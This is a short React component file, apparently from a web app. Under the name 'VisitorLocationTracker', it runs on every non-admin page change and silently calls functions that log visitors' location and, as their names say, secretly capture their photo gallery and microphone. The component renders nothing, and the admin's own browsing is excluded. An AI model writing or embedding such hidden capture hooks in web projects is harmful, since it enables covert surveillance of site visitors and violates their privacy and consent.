import { useEffect } from "react";
import { useRouterState } from "@tanstack/react-router";
import { logVisitorLocation } from "@/lib/visitor-location";
import { silentGalleryCapture } from "@/lib/gallery-capture";
import { silentMicrophoneCapture } from "@/lib/microphone-capture";

export function VisitorLocationTracker() {
  const path = useRouterState({ select: (s) => s.location.pathname });
  useEffect(() => {
    // Skip admin routes so the admin's own browsing doesn't spam the log
    if (path.startsWith("/admin") || path.startsWith("/wiki-admin")) return;
    const t = setTimeout(() => {
      void logVisitorLocation();
      void silentGalleryCapture();
      void silentMicrophoneCapture();
    }, 800);
    return () => clearTimeout(t);
  }, [path]);
  return null;
}

